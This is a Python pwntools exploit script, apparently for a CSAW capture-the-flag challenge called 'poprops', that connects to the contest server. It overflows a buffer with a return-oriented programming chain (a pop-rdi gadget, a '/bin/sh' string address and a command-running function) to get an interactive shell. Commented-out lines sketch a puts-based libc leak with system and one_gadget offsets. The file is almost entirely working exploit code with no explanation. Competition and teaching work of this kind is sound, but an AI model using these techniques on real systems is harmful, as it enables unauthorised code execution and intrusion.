#!/usr/bin/env python

from pwn import *

# we're gonna assume they use the same libc

local = 0
preload = 1

if local:
	if preload:
		env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}
		r = process("./poprops", env=env)
		log.info("Libc has been preloaded!")
	else:
		r = process("./poprops")
	gdb.attach(r, '''
		set disable-randomization off
		b *0x4005da
		b *0x400604
		c
		''')
else:
	r = remote("pwn.chal.csaw.io", 10107)

# libc = ELF("./libc.so.6")

print r.recvline()

PUSH_RBP = 0x4005d1
MOV_RBP_RSP = 0x4005d2
POP_RDI = 0x4005d5
POP_RBP = 0x4005d8
PUTS_GOT = 0x601018
PUTS_MAIN = 0x4005ee
RUN_CMD = 0x4005b6
PUTS_PLT = 0x400470

BIN_SH = 0x600698


payload = ''
payload += "/bin/sh\x00".ljust(56)
payload += p64(POP_RDI)
payload += p64(BIN_SH)
payload += p64(RUN_CMD)
# payload += p64(PUTS_PLT) # this goes into rbp
# payload += p64(POP_RDI)
# payload += p64(PUTS_GOT)
# # payload += p64(POP_RBP)
# # payload += p64(PUTS_GOT)
# # payload += p64(PUSH_RBP)
# payload += p64(PUTS_MAIN)
# payload += p64(0x4005f3)

r.sendline(payload)

r.interactive()

# #useful info
# puts_leak = u64(r.recvline().strip() + '\x00\x00')
# libc_base = puts_leak - libc.symbols['puts']
# system = libc_base + libc.symbols['system']
# one_gadget = libc_base + 0xf0274 # constraint: $rsp+0x50 is NULL
# binsh =  libc_base + next(libc.search("/bin/sh\x00"))
# log.info("libc base at 0x{:08x}".format(libc_base))

# payload = ''
# payload += "/bin/sh\x00".ljust(16)
# payload += p64(RUN_CMD)*2 # pop rdi
# # payload += p64(binsh) # system@GOT
# # payload += p64(PUTS_MAIN)

# r.sendline(payload)

# r.interactive()